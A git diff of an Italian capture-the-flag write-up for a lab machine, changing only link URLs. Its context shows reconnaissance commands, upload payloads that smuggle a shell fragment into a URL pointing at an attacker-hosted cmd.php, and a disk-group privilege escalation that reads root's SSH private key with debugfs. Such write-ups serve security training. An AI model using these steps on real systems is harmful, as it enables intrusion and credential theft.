@@ -19,14 +19,14 @@ tags:
 
 ## Ricognizione iniziale
 
-Si parte con [nmap](https://hackita.it/articoli/nmap/): solo due porte aperte, 22 (ssh) e 80 (http).
+Si parte con [nmap](/articoli/nmap/): solo due porte aperte, 22 (ssh) e 80 (http).
 
 ```bash
 nmap -sT -p- --min-rate 5000 -oA nmap/alltcp 10.10.10.73
 nmap -sC -sV -p 80,22 -oA nmap/scripts 10.10.10.73
 ```
 
-Il sito espone un `robots.txt` che disabilita `*.txt`. Un `robots.txt` che nasconde un'estensione è quasi sempre un invito a includerla nel bruteforce delle directory, quindi via con [gobuster](https://hackita.it/articoli/gobuster/):
+Il sito espone un `robots.txt` che disabilita `*.txt`. Un `robots.txt` che nasconde un'estensione è quasi sempre un invito a includerla nel bruteforce delle directory, quindi via con [gobuster](/articoli/gobuster/):
 
 ```bash
 gobuster -u http://10.10.10.73 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x txt,php,html -t 30
@@ -81,7 +81,7 @@ Esistono liste di stringhe note (i cosiddetti *magic hash*) il cui md5 produce p
 
 ## RCE via upload: truncation del nome file
 
-Da admin si sblocca `upload.php`: prende un URL, scarica l'immagine e la salva con lo stesso nome, con whitelist sulle estensioni (`png`, `gif`, `jpg`). Prima di trovare la strada giusta, un bel po' di tentativi falliscono — ne parlo più nel dettaglio, con tutti i payload provati e perché non funzionano, in [questo articolo dedicato agli attacchi di file upload](https://hackita.it/articoli/file-upload-attack/). In breve, qui non hanno funzionato:
+Da admin si sblocca `upload.php`: prende un URL, scarica l'immagine e la salva con lo stesso nome, con whitelist sulle estensioni (`png`, `gif`, `jpg`). Prima di trovare la strada giusta, un bel po' di tentativi falliscono — ne parlo più nel dettaglio, con tutti i payload provati e perché non funzionano, in [questo articolo dedicato agli attacchi di file upload](/articoli/file-upload-attack/). In breve, qui non hanno funzionato:
 
 ```text
 http://IP:8081/cmd.php'; echo png #        -> nessun upload
@@ -193,7 +193,7 @@ ssh yossi@10.10.10.73
 
 ## Privesc: yossi → root (gruppo disk)
 
-I gruppi di yossi includono `disk`, che dà accesso in lettura diretta ai device grezzi (`/dev/sda1`, `/dev/sda5` la swap), bypassando completamente i permessi sui singoli file del filesystem — perché si sta leggendo il blocco fisico, non passando dalla VFS. Ne parlo in dettaglio, con tutti i gruppi Linux sfruttabili per privesc, in [questo articolo](https://hackita.it/articoli/group-linux-privilege-escalation/).
+I gruppi di yossi includono `disk`, che dà accesso in lettura diretta ai device grezzi (`/dev/sda1`, `/dev/sda5` la swap), bypassando completamente i permessi sui singoli file del filesystem — perché si sta leggendo il blocco fisico, non passando dalla VFS. Ne parlo in dettaglio, con tutti i gruppi Linux sfruttabili per privesc, in [questo articolo](/articoli/group-linux-privilege-escalation/).
 
 Con `debugfs` monto la partizione principale in sola lettura logica e vado dritto alla chiave privata SSH di root, senza bisogno di leggere flag o shadow:
 
